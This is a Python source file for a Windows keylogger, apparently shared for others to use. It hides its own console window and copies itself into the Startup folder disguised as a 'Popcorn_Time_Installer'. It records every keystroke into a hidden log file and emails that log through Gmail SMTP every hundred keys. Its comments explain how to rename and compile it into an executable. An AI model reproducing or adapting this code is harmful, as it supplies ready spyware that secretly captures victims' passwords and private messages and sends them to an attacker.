import shutil
import time
import os
import datetime
import smtplib
import keyboard
import subprocess
from os import path
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
from datetime import date
from pynput.keyboard import Key, Listener

# Created by: @cryptoplusplus 
# Support me on Instagram: @cryptoplusplus / Twitter: @cryptoppguy / Facebook: aleksa.pavkovic.7

try:
    import win32gui, win32con;

    window = win32gui.GetForegroundWindow();
    title  = win32gui.GetWindowText(window);
    if title.endswith("python.exe"):
        win32gui.ShowWindow(window, win32con.SW_HIDE);
    #endif
except:
    pass

pwd = os.getcwd()
file_dir = pwd + '\\Popcorn_Time_Installer.py'  #   NOTE - CHANGE THE EXTENSION TO .EXE AND NAME IF YOU WANT, WHEN COMPILING (PY2EXE / PYINSTALLER)

appdata = path.expandvars(r'%APPDATA%')     #   Get Address of AppData
startup = appdata + '\Microsoft\Windows\Start Menu\Programs\Startup'    #   Get Address of Startup    
shutil.copy(file_dir, startup)  #   Copy file to startup

sendto_dir = path.expandvars(r'%TEMP%') #   Get path of TEMP
shutil.move(file_dir, sendto_dir)   #   Move this file to %TEMP%


create_file = open("log.txt", 'w')  #   Creates log.txt
subprocess.call(["attrib", "+H", "log.txt"])  #   Set file attribute to hidden


t = 5000  #   Number of pressed keys (change this if you want)

def send_email():   #   Send mail method
      
    today = date.today()
    current_date = today.strftime("%d/%m/%Y")
    
    now = datetime.now()
    current_time = now.strftime("%H:%M:%S")

    subject = 'NOTIFICATION FROM KEYLOGGER!'
    
    email_user = 'example@gmail.com'   #   Change this to your email addres
    email_send = 'example@gmail.com'   #   Change this to email that you want to get attachment (receiving email)
    email_password = '1234567'  #   Change this to your password

    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = subject
   
    body = 'New log from keylogger, since --> ' + current_date + ' ' + current_time
    msg.attach(MIMEText(body,'plain'))
    
    filename = 'log.txt'
    attachment = open(filename,'rb')

    part = MIMEBase('application','octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',"attachment; filename= " + filename)
    
    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email_user, email_password)
      
    server.sendmail(email_user, email_send,text)

def on_press(key):  #   On_Press Method
    global t
    t = t - 1
    real_key = str(key).replace("'","")
    if key == Key.space:
        real_key = " "
    elif key == Key.backspace:
        real_key = "[BKSP]"
    elif key == Key.enter:
        real_key = "[ENTER]\n"
    elif key == Key.shift:
        real_key = "[SHIFT]"
    elif key == Key.tab:
        real_key == "[TAB]"
    elif key == Key.cmd:
        real_key = "[WIN_KEY]"
    with open("log.txt", "a") as file:
        file.write(real_key)
    if t != 5000 and t % 100 == 0:
        send_email()
    if t == 0:
        return False

with Listener(on_press=on_press) as listener:   #   Listener
    listener.join()  

